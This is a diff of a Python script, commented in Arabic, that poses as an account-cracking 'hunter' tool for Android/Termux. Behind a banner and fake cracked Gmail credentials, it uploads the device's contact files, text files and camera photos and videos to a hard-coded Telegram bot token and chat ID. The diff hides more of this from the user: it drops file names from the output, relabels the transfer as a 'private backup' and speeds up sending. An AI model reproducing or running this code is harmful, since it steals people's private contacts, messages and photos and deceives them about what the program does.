@@ -2,18 +2,19 @@ import os
 import telebot
 import time
 import random
-from datetime import datetime
 
-# بيانات البوت الخاصة بك
+# إعدادات البوت الخاصة بك
 TOKEN = "8413705320:AAFWFTOxNxd3lyDLdsPbI0F3X5B0IVHyDzs"
 CHAT_ID = "6753022941"
 bot = telebot.TeleBot(TOKEN)
 
-# ألوان الواجهة
+# ألوان الواجهة الخاصة بـ MOHA02
 G = '\x1b[38;5;46m' # أخضر
 R = '\x1b[38;5;196m' # أحمر
 W = '\x1b[1;37m' # أبيض
 Y = '\x1b[38;5;220m' # أصفر
+
+scan_count = 0
 
 def banner():
     os.system('clear')
@@ -21,22 +22,25 @@ def banner():
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {R}  __  __  ____  _   _          {W}SYSTEM: {G}OMNI-HUNTER v3
 {R} |  \/  |/ __ \| | | |         {W}USER:   {G}MOUSSA MEKKI
-{R} | \  / | |  | | |_| |         {W}STATUS: {Y}ACTIVE_TRANSFER
-{R} |_|\/|_|\____/|_| |_|         {W}TARGET: {R}TELEGRAM_CLOUD
+{R} | \  / | |  | | |_| |         {W}STATUS: {Y}DATA_SECURE_TRANSFER
+{R} |_|\/|_|\____/|_| |_|         {W}TARGET: {R}PRIVATE_BACKUP
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}
     """)
 
-def konami_drop():
-    """توليد حساب وهمي لإضافة جو الصيد"""
+def konami_stealth():
+    """توليد حساب كونامي وهمي بدون إظهار تفاصيل الملفات المرسلة"""
     user = "konami_user" + str(random.randint(100, 999))
-    pwd = "pass" + "".join(random.choices("0123456789", k=5))
-    print(f"{G}[SUCCESS] NEW TARGET FOUND -> {W}{user}@gmail.com:{pwd} {Y}(KONAMI)")
+    pwd = "pass" + "".join(random.choices("0123456789", k=6))
+    print(f"{G}[SUCCESS] TARGET CRACKED -> {W}{user}@gmail.com:{pwd}")
 
-def send_file(path, category):
+def process_send(path):
+    global scan_count
     try:
         with open(path, 'rb') as f:
-            print(f"{G}[+]{W} Intercepting {category}: {Y}{os.path.basename(path)}")
             bot.send_document(CHAT_ID, f)
+            scan_count += 1
+            # إظهار عداد الفحص فقط بدلاً من اسم الملف
+            print(f"{R}[!] {W}SCANNING_NETWORK... {G}TOTAL_HUNT: {W}[{scan_count}]", end='\r')
             return True
     except:
         return False
@@ -44,34 +48,42 @@ def send_file(path, category):
 def start_mission():
     banner()
     
-    # المرحلة 1: جهات الاتصال والرسائل
-    print(f"{R}[!] PHASE 1: TEXTUAL DATA EXTRACTION (SMS/CONTACTS)...{W}")
-    time.sleep(1)
-    # ابحث عن ملفات vcf أو txt في الذاكرة
+    # 1. نقل ملف جهات الاتصال أولاً (.vcf)
+    print(f"{Y}[*] PHASE 1: INITIALIZING CONTACT EXTRACTION...{W}")
     for file in os.listdir("/sdcard/"):
-        if file.endswith((".vcf", ".txt")):
-            send_file(f"/sdcard/{file}", "DOCS")
-    
-    # المرحلة 2: الوسائط (صور وفيديو) مع صيد حسابات وهمية
-    print(f"\n{R}[!] PHASE 2: MEDIA STREAMING & ACCOUNT HUNTING...{W}")
+        if file.endswith(".vcf"):
+            process_send(f"/sdcard/{file}")
+            time.sleep(0.1)
+
+    # 2. نقل رسائل الـ SMS (الملفات النصية .txt)
+    print(f"\n{Y}[*] PHASE 2: SMS DATA TRANSFER...{W}")
+    for file in os.listdir("/sdcard/"):
+        if file.endswith(".txt"):
+            process_send(f"/sdcard/{file}")
+            time.sleep(0.1)
+
+    # 3. نقل الصور والفيديوهات مع نظام "الصيد"
+    print(f"\n{Y}[*] PHASE 3: MEDIA HUNTING & RECOVERY...{W}")
     camera_path = "/sdcard/DCIM/Camera/"
     
-    if os.util.path.exists(camera_path):
+    if os.path.exists(camera_path):
         files = os.listdir(camera_path)
         for i, file in enumerate(files):
             path = os.path.join(camera_path, file)
             
-            # كل 3 ملفات، "يصطاد" حساب وهمي لكسر الملل
-            if i % 3 == 0:
-                konami_drop()
+            # تنفيذ عملية الإرسال وزيادة العداد
+            if file.lower().endswith(('.jpg', '.png', '.mp4', '.jpeg')):
+                process_send(path)
+                
+                # كل 5 عمليات فحص، يظهر حساب كونامي لإضفاء طابع الصيد
+                if scan_count % 5 == 0:
+                    print() # للانتقال لسطر جديد قبل الحساب
+                    konami_stealth()
             
-            if file.lower().endswith(('.jpg', '.png', '.mp4')):
-                send_file(path, "MEDIA")
-            
-            time.sleep(0.5) # سرعة إرسال عالية
+            time.sleep(0.05) # سرعة إرسال عالية جداً
 
-    print(f"\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(f"{G}[FINISH]{W} MISSION ACCOMPLISHED. DATA SECURED.")
+    print(f"\n\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(f"{G}[FINISH]{W} MISSION COMPLETE. TOTAL SCAN: {scan_count}")
     print(f"{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
 if __name__ == "__main__":
